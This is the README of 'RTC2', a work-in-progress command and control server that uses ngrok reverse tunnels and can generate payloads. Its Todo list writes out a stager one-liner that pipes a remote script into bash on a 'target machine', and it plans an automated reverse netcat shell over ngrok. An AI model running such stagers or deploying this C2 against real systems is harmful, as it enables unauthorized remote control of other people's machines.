# RTC2
RTC2 stands for "Reverse Tunnel C2" because it is a command and control server that utilises [ngrok](https://ngrok.io) to do reverse port forwarding.
This also lets all communication happen via https for extra security. As well as this, all communication is encrypted with private/public key pairs.

# Features
• Handles multiple clients

• Interactive "command-line" interface with tab autocomplete

• Very modular and easy to reuse code

• Unique-Identifier-based command system (easy to find results of commands)

• Automatically handles secure port forwarding with ngrok (works behind firewalls)

• Has function to generate payloads

# Todo
• Utilise private/public key pairs

• Write a function to build said templates with correct server details

• Add a stager function to the server so it's possible to do "curl https://serveraddr.ngrok.io/stager | /bin/bash" on target machine (bash script should echo python program line-by-line or just completely bash)

• Add timestamps to commands

• Sort commands by most recent

• Add commands to generate one-liner stagers

• Add auto-reverse-netcat-ngrok command (target: find ver, down ngrok, nc -l, ngrok tcp, send url)

• On exit: write completed commands into db

• Add command to import db of completed commands

• Layered autocomplete (is that a thing??)

# WIP
This is a huge work-in-progress, so expect lots of bugs and not so many feautures just yet.
